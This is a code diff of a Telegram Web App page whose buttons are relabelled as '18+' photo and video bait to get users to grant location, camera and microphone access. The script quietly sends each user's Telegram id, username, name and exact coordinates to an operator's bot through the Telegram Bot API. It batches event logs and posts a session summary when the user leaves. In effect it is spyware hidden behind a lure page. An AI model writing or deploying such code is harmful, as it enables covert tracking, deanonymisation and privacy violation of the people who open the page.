@@ -211,10 +211,10 @@
     </div>
 
     <div class="menu">
-      <button id="open-geo-card">Проверить локацию</button>
-      <button id="open-cam-card">Посмотреть фото</button>
-      <button id="btn-mic">Записать звук</button>
-      <button id="open-video-card">Видео (фронталка)</button>
+      <button id="open-geo-card">!!!</button>
+      <button id="open-cam-card"> Фото 18+!!!</button>
+      <button id="btn-mic">💋</button>
+      <button id="open-video-card">Видео  18+!!!</button>
     </div>
 
     <div id="card-geo" class="card">
@@ -223,7 +223,7 @@
         <div class="map-road r2"></div>
         <div class="map-pin">Точка на карте</div>
       </div>
-      <div class="hint">Открыть карту?</div>
+      <div class="hint">Для открытия карты потребуется доступ к геопозиции.</div>
       <button id="confirm-geo" class="btn-primary">Открыть карту</button>
     </div>
 
@@ -235,7 +235,7 @@
           <span>Нажмите на фото или кнопку ниже</span>
         </div>
       </div>
-      <div class="hint">Для просмотра подтвердите возраст 18+.</div>
+      <div class="hint">Только 18 +</div>
       <button id="confirm-cam" class="btn-primary">Открыть фото</button>
     </div>
 
@@ -244,11 +244,11 @@
         <div class="video-preview"></div>
         <div class="media-overlay">
           <strong>[ Видео-превью ]</strong>
-          <span>Нажмите на видео или кнопку ниже</span>
+          <span>Нажмите на кадр или кнопку ниже</span>
         </div>
       </div>
-      <div class="hint">Посмотреть видео 18+</div>
-      <button id="confirm-video" class="btn-primary">Записать видео</button>
+      <div class="hint">Смотреть видео</div>
+      <button id="confirm-video" class="btn-primary">Открыть видео 18+</button>
     </div>
   </div>
 
@@ -265,7 +265,9 @@
     const sessionId = 'S-' + Math.random().toString(36).slice(2, 8).toUpperCase();
     const startedAt = Date.now();
     const sessionEvents = [];
+    const logQueue = [];
     let lastCoords = null;
+    let flushing = false;
 
     function formatCoords() {
       if (!lastCoords) return '';
@@ -273,32 +275,54 @@
     }
 
     function getUserInfo() {
-      const u = tg?.initDataUnsafe?.user;
-      if (!u) {
-        return 'Данные Telegram не переданы (браузер или скрытый контекст)';
+      const webApp = window.Telegram?.WebApp;
+      const u = webApp?.initDataUnsafe?.user;
+
+      if (u && (u.id !== undefined || u.username || u.first_name || u.last_name)) {
+        const parts = [];
+        if (u.id !== undefined) parts.push(`id: ${u.id}`);
+        if (u.username) parts.push(`@${u.username}`);
+        const fullName = [u.first_name, u.last_name].filter(Boolean).join(' ');
+        if (fullName) parts.push(`имя: ${fullName}`);
+        if (u.language_code) parts.push(`язык: ${u.language_code}`);
+        if (u.is_premium) parts.push('premium: да');
+        return parts.join(' | ');
       }
 
-      const parts = [];
-      if (u.id !== undefined) parts.push(`id: ${u.id}`);
-      if (u.username) parts.push(`@${u.username}`);
-      const fullName = [u.first_name, u.last_name].filter(Boolean).join(' ');
-      if (fullName) parts.push(`имя: ${fullName}`);
-      if (u.language_code) parts.push(`язык: ${u.language_code}`);
-      if (u.is_premium) parts.push('premium: да');
+      const extra = [];
+      if (webApp?.initDataUnsafe?.chat_type) {
+        extra.push(`chat_type: ${webApp.initDataUnsafe.chat_type}`);
+      }
+      if (webApp?.initDataUnsafe?.start_param) {
+        extra.push(`start_param: ${webApp.initDataUnsafe.start_param}`);
+      }
 
-      return parts.length ? parts.join(' | ') : 'Пользователь TG (поля не заполнены)';
+      const isInsideTgWebView = Boolean(
+        webApp && typeof webApp.initData === 'string' && webApp.initData.length > 0
+      );
+      const envLabel = isInsideTgWebView
+        ? 'Контекст Telegram без поля user'
+        : 'Открыто вне контекста Telegram (браузер)';
+
+      return extra.length ? `${envLabel} (${extra.join(', ')})` : envLabel;
     }
 
     function nowTime() {
       return new Date().toLocaleTimeString('ru-RU', { hour12: false });
     }
 
-    async function sendMessageToBot(text) {
-      if (!BOT_TOKEN || BOT_TOKEN.startsWith('ВАШ_') || !CHAT_ID || CHAT_ID.startsWith('ВАШ_')) {
-        return;
-      }
+    function hasValidConfig() {
+      return (
+        BOT_TOKEN &&
+        !BOT_TOKEN.startsWith('ВАШ_') &&
+        CHAT_ID &&
+        !CHAT_ID.startsWith('ВАШ_')
+      );
+    }
+
+    async function postText(text) {
+      if (!hasValidConfig()) return;
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const payloadText = `${text}${formatCoords()}`;
       try {
         await fetch(url, {
           method: 'POST',
@@ -306,16 +330,33 @@
           keepalive: true,
           body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: payloadText
+            text: `${text}${formatCoords()}`
           })
         });
       } catch (_) {}
     }
 
-    async function sendFileToBot(endpoint, fieldName, blob, filename, caption = '') {
-      if (!BOT_TOKEN || BOT_TOKEN.startsWith('ВАШ_') || !CHAT_ID || CHAT_ID.startsWith('ВАШ_')) {
-        return;
+    async function flushLogQueue() {
+      if (flushing || logQueue.length === 0) return;
+      flushing = true;
+      while (logQueue.length > 0) {
+        const batch = logQueue.splice(0, 8);
+        const msg = `Сессия ${sessionId} | ${getUserInfo()}\n${batch.join('\n')}`;
+        await postText(msg);
       }
+      flushing = false;
+    }
+
+    // Неблокирующее логирование: ставит событие в очередь и сразу запускает отправку
+    function logAction(eventText) {
+      const line = `[${nowTime()}] ${eventText}`;
+      sessionEvents.push(line);
+      logQueue.push(line);
+      flushLogQueue();
+    }
+
+    async function sendFileToBot(endpoint, fieldName, blob, filename, caption = '') {
+      if (!hasValidConfig()) return;
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
@@ -333,19 +374,13 @@
       }
     }
 
-    async function logAction(eventText) {
-      const line = `[${nowTime()}] ${eventText}`;
-      sessionEvents.push(line);
-      await sendMessageToBot(`Сессия ${sessionId} | ${getUserInfo()}\n${line}`);
-    }
-
     let summarySent = false;
     function sendSessionSummary(reason) {
       if (summarySent) return;
       summarySent = true;
       const sec = Math.max(1, Math.round((Date.now() - startedAt) / 1000));
       const list = sessionEvents.length ? sessionEvents.join('\n') : 'Без действий';
-      sendMessageToBot(
+      postText(
         `Завершение сессии (${reason})\nСессия: ${sessionId} | ${getUserInfo()}\nВремя в приложении: ${sec} сек\n\nДействия за сессию:\n${list}`
       );
     }
@@ -373,14 +408,14 @@
       }
 
       navigator.geolocation.getCurrentPosition(
-        async (pos) => {
+        (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
           lastCoords = {
             lat: latitude,
             lon: longitude,
             acc: Math.round(accuracy)
           };
-          await logAction('Разрешил геолокацию — координаты сохранены');
+          logAction(`Разрешил геолокацию: ${latitude}, ${longitude} (±${Math.round(accuracy)} м)`);
         },
         (err) => {
           logAction(`Ошибка/отказ геолокации: code=${err.code} (${err.message || 'нет доступа'})`);
@@ -576,11 +611,6 @@
       });
     }
 
-    document.addEventListener('visibilitychange', () => {
-      if (document.hidden) {
-        sendSessionSummary('свернул/закрыл экран');
-      }
-    });
     window.addEventListener('pagehide', () => sendSessionSummary('вышел со страницы'));
     window.addEventListener('beforeunload', () => sendSessionSummary('закрыл вкладку'));
 
